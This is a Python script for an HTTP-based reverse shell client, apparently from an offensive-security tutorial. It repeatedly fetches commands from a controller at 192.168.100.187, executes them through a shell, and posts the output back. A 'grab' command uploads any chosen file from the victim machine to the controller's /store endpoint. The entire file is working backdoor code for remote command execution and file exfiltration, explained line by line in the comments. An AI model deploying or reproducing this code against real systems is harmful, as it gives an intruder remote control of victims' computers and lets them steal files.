#Basic HTTP client

import requests # Download Link https://pypi.python.org/pypi/requests#downloads
import subprocess # to start the shell in the system
import time
import os


while True: 

    req = requests.get('http://192.168.100.187') # send GET request to our HTTP sever
    command = req.text # store the received txt into command variable
        
    if 'terminate' in command:
        break # end loop

    # Now similar to what we have done in our TCP reverse shell, we check if file exisit in the first place, if not then we 
    # notify our attacker that we are unable to find the file, but if the file is there then we will :-
    # 1.Append /store in the URL
    # 2.Add a dictionary key called 'file'
    # 3.requests library use POST method called "multipart/form-data" when submitting files

    #All of the above points will be used on the server side to distinguish that this POST is for submitting a file NOT a usual command output
    #Please see the server script for more details on how we can use these points to get the file
    
    elif 'grab' in command:

        grab, path = command.split('*')
        if os.path.exists(path):
            url = 'http://192.168.100.187/store' # append /store in URL
            files = {'file': open(path, 'rb')} # add a dictionary key called 'file' where the key value is the file itself
            r = requests.post(url, files=files) # send the file and behind the scenes, requests lib use POST method called "multipart/form-data"

        else: # file does not exist
            post_response = requests.post(url='http://192.168.100.187', data='[-] Not able to find the file!')

    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.100.187', data=CMD.stdout.read() )  # POST the result 
        post_response = requests.post(url='http://192.168.100.187', data=CMD.stderr.read() )  # or the error -if any-

    time.sleep(3)
    

